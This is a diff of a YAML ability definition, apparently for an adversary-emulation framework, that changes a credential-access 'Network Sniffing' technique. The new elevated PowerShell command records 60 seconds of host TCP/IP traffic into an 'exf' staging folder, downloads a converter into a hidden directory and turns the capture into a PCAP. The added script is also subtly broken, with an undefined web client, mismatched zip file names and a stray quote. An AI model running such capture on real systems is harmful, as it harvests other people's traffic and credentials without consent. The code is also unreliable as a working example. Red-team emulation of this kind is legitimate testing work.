@@ -1,7 +1,8 @@
 - tactic: credential-access
   singleton: false
   technique_name: Network Sniffing
-  description: Packet capture saved to a PCAP file
+  description: Packet capture generates etl file, download etl2pcapng from GitHub
+    and convert the ETL to PCAP
   repeatable: false
   plugin: ''
   requirements: []
@@ -14,17 +15,24 @@
     name: psh
     build_target: null
     payloads: []
-    command: "$path = \"$ENV:public\\capture.pcap\";\nNew-NetEventSession -Name \"\
-      PCAP\" -CaptureMode SaveToFile -LocalFilePath $path;\nAdd-NetEventProvider -Name\
-      \ \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\";\nStart-NetEventSession\
+    command: "$path = \"$env:PUBLIC\\exf\\capture.etl\";\nNew-NetEventSession -Name\
+      \ \"PCAP\" -CaptureMode SaveToFile -LocalFilePath $path;\nAdd-NetEventProvider\
+      \ -Name \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\";\nStart-NetEventSession\
       \ -Name \"PCAP\";\nStart-Sleep -s 60;\nStop-NetEventSession -Name \"PCAP\";\n\
-      if (Test-Path $path) {\n  echo $path;\n  exit 0;\n} else {\n  echo \"Failed\
-      \ to generate PCAP file.\";\n  exit 1;\n};"
-    timeout: 80
+      if (Test-Path $path) {\n  echo $path;\n$result = $web.DownloadFile(\"https://github.com/microsoft/etl2pcapng/releases/download/v1.7.0/etl2pcapng.zip\"\
+      ,\n      \"etl2pcapnt.zip\");\n      New-Item -ItemType \"directory\" $env:PUBLIC\\\
+      etlpcapng -Force;\n      $psdir=Get-Item \"$env:PUBLIC\\etlpcapng\" -Force;\n\
+      \      $psdir.attributes=\"hidden\";\n      Add-Type -Assembly ''System.IO.Compression.FileSystem'';\
+      \ [System.IO.Compression.ZipFile]::ExtractToDirectory(\"$env:PUBLIC\\etlpcapng\\\
+      etlpcapng.zip\",\n      \"$env:PUBLIC\\etlpcapng\");'\n$env:PUBLIC\\etlpcapng\\\
+      etlpcapng.exe $env:PUBLIC\\exf\\capture.etl $env:PUBLIC\\exf\\capture.pcap \
+      \ \nexit 0;\n} else {\n  echo \"Failed to generate PCAP file.\";\n  exit 1;\n\
+      };"
+    timeout: 90
     code: null
     parsers: []
     additional_info: {}
-  name: Sniff network traffic and saves pcap file using PowerShell
+  name: Sniff network traffic and convert etl to pcap file using etl2pcapng
   privilege: Elevated
   buckets:
   - credential-access
